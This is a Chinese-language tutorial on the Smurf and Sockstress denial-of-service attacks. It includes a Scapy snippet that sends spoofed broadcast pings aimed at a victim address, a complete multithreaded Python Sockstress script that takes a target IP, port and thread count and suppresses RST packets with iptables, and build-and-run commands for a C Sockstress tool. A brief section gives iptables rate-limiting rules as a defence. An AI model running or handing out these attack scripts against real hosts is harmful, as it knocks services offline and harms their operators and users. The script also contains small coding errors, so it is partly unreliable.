
# Smurf 和 Sockstress

* Smurf

* Sockstress


## Smurf
> * 世界上最古老的DDoS攻击技术　（了解即可）
>   - 向广播地址发送伪造源地址的 ICMP echo Request（ping）包
>   - LAN所有计算机向伪造源地址返回响应包
>   - 对现代操作系统几乎无效（不响应目标为广播的ping）

* Scapy
```python
i=IP()
i=src="1.1.1.1"　　// 这个源地址即你要攻击的IP地址
i.dst="1.1.1.255"　　// 向广播地址发送ping数据包，因为设的源地址为1.1.1.1，所以其会想1.1.1.1回大量的数据包，这就是为什么说src就是你要攻击的IP地址
p=ICMP()
p.display()
r=(i/p)
send(IP(dst="1.1.1.255",src="1.1.1.2")/ICMP(),count=100,verbose=1)
```

## Sockstress

> * 2008年由Jack C. Louis 发现
> * 针对TCP服务的拒绝服务攻击
>   - 消耗被攻击目标系统资源
>   - 与攻击目标建立大量socket连接
>   - 完成三次握手，最后的ACK包 window 大小为 0（客户端不接收数据）
>   - 攻击者资源消耗小（CPU、内存、带宽）
>   - 异步攻击，单机可拒绝服务高配资源服务器
>   - Window窗口实现的TCP流控

* 实例1 - python
```python
#!/usr/bin/python
# -*- coding:utf-8 -*-
 
from scapy.all import *
from time import sleep
import thread
import logging
import os
import signal
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
if len(sys.argv) !=4:
    print("用法：./sock_stress.py [目标IP] [端口] [线程数]")
    print("举例：./sock_stress.py 10.0.0.2 21 20  #请确定被攻击端口处于开放状态")
    sys.exit()
    
target = str(sys.argv[1])
dstport = str(sys.argv[2])
thread = str(sys.argv[3])
 
## 攻击函数
def sockstress(target,dstport):
    while 0 == 0:
        try:
            x = random.randint(0,65535)
            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags='S'),timeout=1,verbose=0)
            send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)     // 这里关键参数是window=0
        except:
            pass
            
      
##  停止攻击函数
def shutdown(signal,frame):
    print("正在恢复 iptables规则 ")
    os.system('iptables -D OUTPUT -p tcp --tcp-flags RST RST -d' + target + '-j DROP')
    sys.exit()
    
##  添加iptables规则
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d' + target + '-j DROP')
signal.signal(signal.SIGINT,shutdown)

##  多线程攻击
print("\n 攻击正在进行.......按Ctrl+c停止攻击")
for x in range(0,threads):
    thread.start_new_thread(sockstress,(target,dstport))
    
##  永远执行
while 0 == 0:
    sleep(1)
```

* 实例2 - C 攻击脚本
> https://github.com/defuse/sockstress
> - gcc -Wall -c sockstress.c
> - gcc -pthread -o sockstress sockstress.o
> - ./sockstress 1.1.1.1:80 eth0
> - ./sockstress 1.1.1.1:80 eth0 -p payloads/http



* 防御措施
> * 直到今天sockstress攻击仍然是一种很有效的DoS攻击方式
> * 由于建立完整的TCP三步握手，因此使用syn cookie防御无效
> * 根本的防御方法是采用白名单（不实际）
> * 折中对策：限制单位时间内每IP建的TCP连接数
>    - 封杀每30秒与80端口建立连接超过10个的IP地址
>    - iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set
>    - iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP
>    - 以上规则对DDoS攻击无效